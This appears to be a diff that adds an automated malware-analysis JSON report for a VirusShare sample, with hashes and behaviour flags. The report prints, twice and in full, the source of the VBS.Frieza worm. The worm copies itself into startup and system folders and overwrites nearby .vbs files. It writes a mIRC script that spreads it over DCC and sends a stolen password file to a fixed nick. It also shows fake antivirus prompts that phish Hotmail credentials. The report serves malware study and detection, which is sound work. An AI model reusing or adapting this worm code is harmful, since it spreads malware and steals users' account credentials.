@@ -1,0 +1,79 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CopyFile": "May copy a file",
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Run": "May run an executable file or a system command",
+            "Shell": "May run an executable file or a system command",
+            "WINDOWS": "May enumerate application windows",
+            "Wscript.Shell": "May run an executable file or a system command",
+            "kill": "May delete a file",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "'VBS.Frieza\n'Thnx to SimplSimon for script help\n'u ever need script help, hes da man to see.\n'Thnx to Knowdeth for help with the VBS.\nOn Error Resume Next\nSet FSO = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = Wscript.CreateObject(\"Wscript.Shell\")\nFrieza = Wscript.ScriptFullName\nFSO.CopyFile Frieza, \"c:\\WINDOWS\\system\\QuakeIII.vbs\"\nFSO.CopyFile Frieza, \"c:\\WINDOWS\\Start Menu\\Programs\\StartUp\\DBZ.vbs\"\nSet Wormy = FSO.CreateTextFile(\"c:\\mirc\\script.ini\", True)\nWormy.WriteLine \"[Script]\"\nWormy.Writeline \"n0=on 1:Join:*:{ if ( $nick = buffy` ) && ( $me isop # ) { .ban # $nick | .kick # $nick | halt } | if ( $nick = $me ) { halt } | .dcc send $nick C:\\windows\\system\\quakeIII.vbs }\"\nWormy.Writeline \"n1=on 1:TEXT:*fr*:#:/msg $chan Frieza is my master\"\nWormy.Writeline \"n2=ctcp 1:GETPW:*:{ if ( $exists(C:\\mirc\\pws.txt) ) { .dcc send Notmeg C:\\mirc\\pws.txt } | halt }\"\nWormy.Close\nSet VLink = WshShell.CreateShortcut(\"C:\\WINDOWS\\Favorites\\Frieza.URL\")\n  VLink.TargetPath = \"http://www.planetnamek.com/insane/\"\n  VLink.Save\nLF = Left(Frieza, InStrRev(Frieza, \"\\\"))\nFor Each target in FSO.GetFolder(LF).Files\nIf FSO.GetExtensionName(target.Name) = \"vbs\" then\nFSO.CopyFile Frieza, target.name, 1\nend if\nnext\nIF Month(now) = 11 Then\nMsgBox \"Frieza-Virus with a power level of 13,000,000\",4096,\"VBS.Frieza\"\nWshShell.Run (\"C:\\WINDOWS\\Favorites\\Frieza.URL\")\nInput = InputBox(\"Hotmail Virus kill Service..Virus detected. to kill...enter your hotmail login\")\nInput2 = InputBox(\"enter your hotmail password to verify your  hotmail member\")\nMsgBox (\"thank you,  \" & Input &  input2 & \"Virus cleaned\")\nSet PW = FSO.CreateTextFile(\"c:\\mirc\\pws.txt\", True)\nPW.WriteLine (\"hey \" & input & \"--\" & Input2)\nPW.Close\n'Frieza\nend if"
+    },
+    "filename": "VirusShare_c574eb04c3a95e9db91d1b5a97bc573f",
+    "filesize": 1764,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "c574eb04c3a95e9db91d1b5a97bc573f",
+        "sha1": "54adaf2c810e781b83a6ea29977c53d6ec31a598",
+        "sha256": "ced35cbcb41d75a26db3d8a4376c8f6bb0da5c9a8453c6bf1f96052579111f7c"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'VBS.Frieza",
+            "'Thnx to SimplSimon for script help",
+            "'u ever need script help, hes da man to see.",
+            "'Thnx to Knowdeth for help with the VBS.",
+            "On Error Resume Next",
+            "Set FSO = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set WshShell = Wscript.CreateObject(\"Wscript.Shell\")",
+            "Frieza = Wscript.ScriptFullName",
+            "FSO.CopyFile Frieza, \"c:\\WINDOWS\\system\\QuakeIII.vbs\"",
+            "FSO.CopyFile Frieza, \"c:\\WINDOWS\\Start Menu\\Programs\\StartUp\\DBZ.vbs\"",
+            "Set Wormy = FSO.CreateTextFile(\"c:\\mirc\\script.ini\", True)",
+            "Wormy.WriteLine \"[Script]\"",
+            "Wormy.Writeline \"n0=on 1:Join:*:{ if ( $nick = buffy` ) && ( $me isop # ) { .ban # $nick | .kick # $nick | halt } | if ( $nick = $me ) { halt } | .dcc send $nick C:\\windows\\system\\quakeIII.vbs }\"",
+            "Wormy.Writeline \"n1=on 1:TEXT:*fr*:#:/msg $chan Frieza is my master\"",
+            "Wormy.Writeline \"n2=ctcp 1:GETPW:*:{ if ( $exists(C:\\mirc\\pws.txt) ) { .dcc send Notmeg C:\\mirc\\pws.txt } | halt }\"",
+            "Wormy.Close",
+            "Set VLink = WshShell.CreateShortcut(\"C:\\WINDOWS\\Favorites\\Frieza.URL\")",
+            "  VLink.TargetPath = \"http://www.planetnamek.com/insane/\"",
+            "  VLink.Save",
+            "LF = Left(Frieza, InStrRev(Frieza, \"\\\"))",
+            "For Each target in FSO.GetFolder(LF).Files",
+            "If FSO.GetExtensionName(target.Name) = \"vbs\" then",
+            "FSO.CopyFile Frieza, target.name, 1",
+            "end if",
+            "next",
+            "IF Month(now) = 11 Then",
+            "MsgBox \"Frieza-Virus with a power level of 13,000,000\",4096,\"VBS.Frieza\"",
+            "WshShell.Run (\"C:\\WINDOWS\\Favorites\\Frieza.URL\")",
+            "Input = InputBox(\"Hotmail Virus kill Service..Virus detected. to kill...enter your hotmail login\")",
+            "Input2 = InputBox(\"enter your hotmail password to verify your  hotmail member\")",
+            "MsgBox (\"thank you,  \" & Input &  input2 & \"Virus cleaned\")",
+            "Set PW = FSO.CreateTextFile(\"c:\\mirc\\pws.txt\", True)",
+            "PW.WriteLine (\"hey \" & input & \"--\" & Input2)",
+            "PW.Close",
+            "'Frieza",
+            "end if"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://www.planetnamek.com/insane/"
+        ]
+    },
+    "time": "0:00:00.279639",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
